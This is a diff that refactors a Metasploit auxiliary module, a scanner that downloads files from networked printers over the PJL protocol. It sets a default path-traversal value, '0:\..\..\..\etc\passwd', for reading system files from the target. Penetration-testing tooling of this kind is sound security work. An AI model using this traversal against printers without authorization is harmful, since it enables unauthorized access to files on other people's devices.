@@ -1,41 +1,47 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require "msf/core"
 require "rex/proto/pjl"
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      "Name" => "Printer File Download Scanner",
-      "Description" => %q{
-        This module downloads a file from a set of printers using the
-        Printer Job Language (PJL) protocol.
-      },
-      "Author" => [
-        "wvu", # Rex::Proto::PJL and modules
-        "sinn3r", # RSpec tests
-        "MC", # Independent mixin and modules
-        "Myo Soe", # Independent modules
-        "Matteo Cantoni <goony[at]nothink.org>" # Independent modules
-      ],
-      "References" => [
-        ["URL", "https://en.wikipedia.org/wiki/Printer_Job_Language"]
-      ],
-      "License" => MSF_LICENSE
-    ))
+    super(
+      update_info(
+        info,
+        "Name" => "Printer File Download Scanner",
+        "Description" => %q{
+          This module downloads a file from a set of printers using the
+          Printer Job Language (PJL) protocol.
+        },
+        "Author" => [
+          "wvu", # Rex::Proto::PJL and modules
+          "sinn3r", # RSpec tests
+          "MC", # Independent mixin and modules
+          "Myo Soe", # Independent modules
+          "Matteo Cantoni <goony[at]nothink.org>" # Independent modules
+        ],
+        "References" => [
+          ["URL", "https://en.wikipedia.org/wiki/Printer_Job_Language"]
+        ],
+        "License" => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options([
       Opt::RPORT(Rex::Proto::PJL::DEFAULT_PORT),
       OptString.new("PATH", [true, "Remote path", '0:\..\..\..\etc\passwd'])
-    ], self.class)
+    ])
   end
 
   def run_host(ip)
@@ -63,5 +69,4 @@ class MetasploitModule < Msf::Auxiliary
       print_good("#{ip}:#{rport} - Saved #{path} as #{res}")
     end
   end
-
 end
